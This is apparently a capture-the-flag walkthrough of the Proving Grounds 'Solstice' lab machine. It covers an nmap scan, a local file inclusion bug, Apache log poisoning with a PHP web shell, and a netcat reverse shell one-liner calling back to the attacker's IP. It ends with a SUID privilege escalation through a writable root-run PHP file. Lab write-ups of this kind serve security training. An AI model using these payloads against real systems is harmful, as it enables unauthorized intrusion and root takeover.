---
layout: default
title: Solstice
parent: Proving Grounds Play
nav_order: 33
---

# Scanning

---

```bash
──(vagrant㉿kali)-[~/Documents/PG/PLAY/solstice]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.222.72
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 23:19 EDT
Nmap scan report for 192.168.222.72
Host is up (0.086s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        pyftpdlib 1.5.6                                                              | ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.222.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp    open  smtp       Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.45.217], SIZE 52428800, 8BITMIME, PIPELINING, C
HUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2121/tcp  open  ftp        pyftpdlib 1.5.6
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.222.72:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  ftp        FreeFloat ftpd 1.00
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

# Enumeration

---

## 8593 - HTTP

Clicking the _Book List_ link directs to a page that looks susceptible to LFI.

![main](../../../assets/images/ctfs/proving_grounds/solstice/main.png)

![book_list](../../../assets/images/ctfs/proving_grounds/solstice/book_list.png)

Running a simple test we can display _/etc/passwd_

![lfi](../../../assets/images/ctfs/proving_grounds/solstice/lfi.png)

# Exploitation

---

## LFI

Start by poisoning the Apache2 access log with a PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/solstice]
└─$ nc -nv 192.168.222.72 80
(UNKNOWN) [192.168.222.72] 80 (http) open
GET /<?php system($_GET['cmd']); ?>
HTTP/1.1 400 Bad Request
Date: Sat, 04 Nov 2023 03:37:05 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>

```

View _/var/log/apache2/access.log_ to see the 400 GET request we sent through netcat.

![log](../../../assets/images/ctfs/proving_grounds/solstice/log.png)

Test RCE with the PHP web shell in the access log.

```bash
URL: http://192.168.222.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=id
```

![rce](../../../assets/images/ctfs/proving_grounds/solstice/rce.png)

Use _revshellgen_ to generate a nc-mknod reverse shell one-liner.

```bash
# Generate reverse shell-oneliner
revshellgen -i 192.168.45.191 -p 9001 -t nc-mknod | tail -n 1

# URL encode the payload
urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.191 9001 1>/tmp/l"

# Run the following URL to get a reverse shell
URL: 192.168.170.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.191%209001%201%3E%2Ftmp%2Fl
```

After executing the payload in our PHP web shell we get a reverse shell on our netcat listener.

![shell](../../../assets/images/ctfs/proving_grounds/solstice/shell.png)

# Post-Exploitation

---

## SUID Permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

The SUID bit on _/var/tmp/sv_ is interesting

![suid](../../../assets/images/ctfs/proving_grounds/solstice/suid.png)

## Enumerate Processes

```bash
ps aux | grep -i 'root' --color=auto
```

![proc](../../../assets/images/ctfs/proving_grounds/solstice/proc.png)

We know from checking SUID directories that _/var/tmp/sv_ has the SUID bit set.

We have full read/write to _/var/tmp/sv/index.php_

![index](../../../assets/images/ctfs/proving_grounds/solstice/index.png)

Edit _index.php_ to execute a PHP system command that generates a root shell by copying _/bin/bash_ to _/var/tmp/bash_

```bash
<?php
echo "You've been pwned!!!!";
system("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
?>
```

![nano](../../../assets/images/ctfs/proving_grounds/solstice/nano.png)

We now need to _curl_ the internally accessible web service running on port 57 in order to execute _index.php_ and generate our
malicious _/var/tmp/bash_ binary.

![curl](../../../assets/images/ctfs/proving_grounds/solstice/curl.png)

Navigate to _/var/tmp_ to see our exploit.

![var_tmp](../../../assets/images/ctfs/proving_grounds/solstice/var_tmp.png)

Execute our malicious _bash_ binary with the _-p_ flag to persist root privileges

![bash](../../../assets/images/ctfs/proving_grounds/solstice/bash.png)
